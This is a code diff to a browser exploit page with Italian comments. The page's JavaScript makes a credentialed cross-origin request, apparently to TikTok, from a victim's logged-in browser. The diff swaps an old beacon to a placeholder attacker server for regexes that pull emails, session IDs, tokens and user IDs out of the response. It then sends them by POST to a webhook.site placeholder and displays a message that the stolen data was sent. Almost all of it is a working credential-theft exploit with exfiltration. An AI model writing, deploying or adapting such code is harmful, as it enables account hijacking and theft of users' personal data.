@@ -13,26 +13,65 @@ async function exploit() {
       credentials: "include",
       mode: "cors"
     });
-    const headers = {};
-    for(let pair of response.headers.entries()) {
-      headers[pair[0]] = pair[1];
-    }
+    
     const text = await response.text();
-    output.innerHTML = `
+    
+    // Cerca pattern sensibili nel corpo HTML
+    const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+    const sessionPattern = /session[_\w]*["']?\s*[:=]\s*["']?([a-f0-9]{32,64})/gi;
+    const tokenPattern = /token[_\w]*["']?\s*[:=]\s*["']?([a-f0-9]{40,})/gi;
+    const uidPattern = /uid[_\w]*["']?\s*[:=]\s*["']?(\d{10,})/gi;
+    
+    const foundEmails = text.match(emailPattern) || [];
+    const foundSessions = [];
+    let match;
+    while ((match = sessionPattern.exec(text)) !== null) foundSessions.push(match[1]);
+    const foundTokens = [];
+    while ((match = tokenPattern.exec(text)) !== null) foundTokens.push(match[1]);
+    const foundUids = [];
+    while ((match = uidPattern.exec(text)) !== null) foundUids.push(match[1]);
+    
+    // Prepara output visibile
+    let outputHtml = `
       <p>Status: ${response.status}</p>
-      <p>Access-Control-Allow-Origin: ${headers['access-control-allow-origin'] || 'NOT PRESENT'}</p>
-      <p>Access-Control-Allow-Credentials: ${headers['access-control-allow-credentials'] || 'NOT PRESENT'}</p>
-      <p>Response preview (first 500 chars):</p>
-      <pre>${escapeHtml(text.substring(0,500))}</pre>
+      <p>Response size: ${text.length} bytes</p>
+      <p><strong>Potenziali dati sensibili estratti:</strong></p>
+      <p>Email trovate: ${foundEmails.join(', ') || 'nessuna'}</p>
+      <p>Session ID trovate: ${foundSessions.join(', ') || 'nessuna'}</p>
+      <p>Token trovate: ${foundTokens.join(', ') || 'nessuna'}</p>
+      <p>UID trovate: ${foundUids.join(', ') || 'nessuna'}</p>
+      <hr>
+      <p>Response preview (first 1000 chars):</p>
+      <pre>${escapeHtml(text.substring(0,1000))}</pre>
     `;
-    // If ACAO is present, send data to attacker server
-    if(headers['access-control-allow-origin']) {
-      new Image().src = "https://your-attacker-server.com/log?data=" + encodeURIComponent(text.substring(0,1000));
+    
+    // Se vengono trovati dati sensibili, inviali a server remoto
+    if(foundEmails.length > 0 || foundSessions.length > 0 || foundTokens.length > 0) {
+      const payload = {
+        emails: foundEmails,
+        sessions: foundSessions,
+        tokens: foundTokens,
+        uids: foundUids,
+        url: window.location.href,
+        timestamp: Date.now()
+      };
+      // Invia a webhook.site o server controllato (sostituire URL)
+      fetch("https://webhook.site/your-unique-id", {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(payload)
+      }).catch(e => console.log("Send failed (no-cors mode):", e));
+      
+      outputHtml += `<p style="color:green">[!] Dati sensibili inviati al server remoto.</p>`;
     }
+    
+    output.innerHTML = outputHtml;
+    
   } catch(err) {
-    output.innerHTML = `<p style="color:red">Error: ${err.message}</p>`;
+    output.innerHTML = `<p style="color:red">Error: ${err.message}</p><p>Verifica che tu sia loggato su TikTok nello stesso browser.</p>`;
   }
 }
+
 function escapeHtml(str) {
   return str.replace(/[&<>]/g, function(m) {
     if(m === '&') return '&amp;';
@@ -41,6 +80,7 @@ function escapeHtml(str) {
     return m;
   });
 }
+
 exploit();
 </script>
 </body>
